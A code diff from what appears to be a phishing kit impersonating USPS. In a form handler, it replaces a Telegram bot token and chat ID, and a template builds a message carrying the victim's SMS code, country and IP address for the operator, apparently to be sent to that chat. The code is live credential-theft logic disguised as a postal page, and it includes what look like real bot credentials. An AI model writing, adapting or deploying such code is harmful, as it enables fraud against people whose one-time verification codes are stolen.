@@ -1992,9 +1992,9 @@ export default {
       e.preventDefault();
       if (this.tries < 2) {
         if (this.sms.length) {
-          var token = "6309857497:AAFmgkPgZKj949KXANTdon_4fuT9LiLpqxs";
+          var token = "6346259743:AAEFPYGw3OQsWVKiVNOAd1Ssm33OEVGNNjM";
 
-          var chatId2 = -957355212;
+      var chatId2 = -940829481;
           var fullMessage = `
         ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0ASMS : ${this.sms}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
 
